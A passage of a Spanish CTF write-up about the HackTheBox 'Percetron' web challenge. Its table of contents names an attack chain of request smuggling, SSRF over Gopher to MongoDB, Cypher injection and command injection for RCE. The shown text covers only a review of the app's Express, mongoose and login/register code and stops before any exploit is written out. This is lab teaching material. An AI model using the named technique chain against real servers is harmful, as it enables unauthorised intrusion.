<!doctype html><html lang="es"><head><title>Percetron | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="HTB CA 2024. HA-Proxy. HTTP _request smuggling_. _Server-Side Request Forgery_. MongoDB _Wire Protocol_. Protocolo Gopher. Inyección Cypher (neo4j). Inyección de comandos. RCE"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2024. HA-Proxy. HTTP _request smuggling_. _Server-Side Request Forgery_. MongoDB _Wire Protocol_. Protocolo Gopher. Inyección Cypher (neo4j). Inyección de comandos. RCE"><meta itemprop="keywords" content><meta itemprop="name" content="Percetron"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="HTB CA 2024. HA-Proxy. HTTP _request smuggling_. _Server-Side Request Forgery_. MongoDB _Wire Protocol_. Protocolo Gopher. Inyección Cypher (neo4j). Inyección de comandos. RCE"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Percetron"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/percetron/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="HTB CA 2024. HA-Proxy. HTTP _request smuggling_. _Server-Side Request Forgery_. MongoDB _Wire Protocol_. Protocolo Gopher. Inyección Cypher (neo4j). Inyección de comandos. RCE"><meta name="twitter:description" content="HTB CA 2024. HA-Proxy. HTTP _request smuggling_. _Server-Side Request Forgery_. MongoDB _Wire Protocol_. Protocolo Gopher. Inyección Cypher (neo4j). Inyección de comandos. RCE"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="Percetron"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/percetron/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/htb-cyber-apocalypse/percetron/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/percetron/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/percetron/&amp;text=Percetron" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/percetron/&amp;title=Percetron" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Percetron</h1><p class="mb4 f6 dib tracked">14 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li><li><a href="#explotación-de-ssrf">Explotación de SSRF</a><ul><li><a href="#mongodb-_wire-protocol_">MongoDB <em>Wire Protocol</em></a></li><li><a href="#protocolo-gopher">Protocolo Gopher</a></li><li><a href="#intentos-fallidos">Intentos fallidos</a></li><li><a href="#http-_request-smuggling_">HTTP <em>request smuggling</em></a></li></ul></li><li><a href="#obteniendo-rce">Obteniendo RCE</a><ul><li><a href="#inyección-cypher-neo4j">Inyección Cypher (neo4j)</a></li><li><a href="#inyección-de-comandos">Inyección de comandos</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un sitio web donde podemos registrarnos e iniciar sesión para tener este <em>dashboard</em>:</p><p><img alt="Percetron 1" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-1.webp"></p><p>Además, tenemos todo el proyecto web para realizar el análisis.</p><h2 id="análisis-del-código-fuente">Análisis del código fuente</h2><p>El servidor web ejecuta Express JS (Node.js). El archivo <code>index.js</code> es bastante estándar, pero podemos ver que usa MongoDB y neo4j:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"dotenv"</span><span class="mtk1">).</span><span class="mtk8">config</span><span class="mtk1">();</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"path"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"express"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">session</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"express-session"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> mongoose </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"mongoose"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./util/neo4j"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./util/mongo"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> { migrate } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./util/generic"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">genericRoutes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./routes/generic"</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">panelRoutes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"./routes/panel"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">application</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">neo4j</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">mongodb</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1">();</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">"/static"</span><span class="mtk1">, </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">static</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk1">__dirname</span><span class="mtk1">, </span><span class="mtk4">"static"</span><span class="mtk1">)));</span>  

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">urlencoded</span><span class="mtk1">({ </span><span class="mtk1">extended</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1"> }));</span>
<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">());</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span>
<span class="mtk1">    </span><span class="mtk8">session</span><span class="mtk1">({</span>
<span class="mtk1">        </span><span class="mtk1">secret</span><span class="mtk1">: </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.SESSION_SECRET,</span>
<span class="mtk1">        </span><span class="mtk1">resave</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk1">saveUninitialized</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">    })</span>
<span class="mtk1">);</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">set</span><span class="mtk1">(</span><span class="mtk4">"view engine"</span><span class="mtk1">, </span><span class="mtk4">"pug"</span><span class="mtk1">);</span>

<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk1">genericRoutes</span><span class="mtk1">);</span>
<span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk1">panelRoutes</span><span class="mtk1">);</span>

<span class="mtk7">setTimeout</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> mongoose.</span><span class="mtk8">connect</span><span class="mtk1">(</span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.MONGODB_URL);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">migrate</span><span class="mtk1">(</span><span class="mtk1">neo4j</span><span class="mtk1">, </span><span class="mtk1">mongodb</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">application</span><span class="mtk1">.</span><span class="mtk8">listen</span><span class="mtk1">(</span><span class="mtk6">3000</span><span class="mtk1">, </span><span class="mtk4">"0.0.0.0"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">"Listening on port 3000"</span><span class="mtk1">);</span>
<span class="mtk1">}, </span><span class="mtk6">10000</span><span class="mtk1">);</span>
</code></pre></div><p>MongoDB se utiliza para la autenticación y autorización del usuario, utilizando <code>mongoose</code>. Este es el único modelo que tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> mongoose </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">"mongoose"</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userSchema</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> mongoose.</span><span class="mtk8">Schema</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">username</span><span class="mtk1">: { </span><span class="mtk8 mtku">type</span><span class="mtk1">: </span><span class="mtk7 mtki">String</span><span class="mtk1">, </span><span class="mtk1">unique</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1"> },</span>
<span class="mtk1">    </span><span class="mtk8 mtku">password</span><span class="mtk1">: </span><span class="mtk7 mtki">String</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk8 mtku">permission</span><span class="mtk1">: </span><span class="mtk7 mtki">String</span><span class="mtk1">,</span>
<span class="mtk1">});</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">Users</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> mongoose.</span><span class="mtk8">model</span><span class="mtk1">(</span><span class="mtk4">"Users"</span><span class="mtk1">, </span><span class="mtk1">userSchema</span><span class="mtk1">);</span>  

<span class="mtk1">module</span><span class="mtk1">.</span><span class="mtk1">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">Users</span><span class="mtk1">;</span>
</code></pre></div><p>Solo hay dos <em>endpoints</em> que interactúan directamente con MongoDB (<code>challenge/routes/panel.js</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">"/panel/register"</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.username;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.password;</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Missing parameters"</span><span class="mtk1">});</span>  
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">registerUser</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">, </span><span class="mtk4">"user"</span><span class="mtk1">)))</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Could not register user"</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel/login"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>

<span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">"/panel/login"</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.username;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.password;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">password</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Missing parameters"</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">MongoDBConnection</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">validateUser</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">)))</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Invalid user or password"</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userData</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getUserData</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">session</span><span class="mtk1">.loggedin </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">session</span><span class="mtk1">.username </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">username</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">session</span><span class="mtk1">.permission </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">userData</span><span class="mtk1">.permission;</span>

<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>
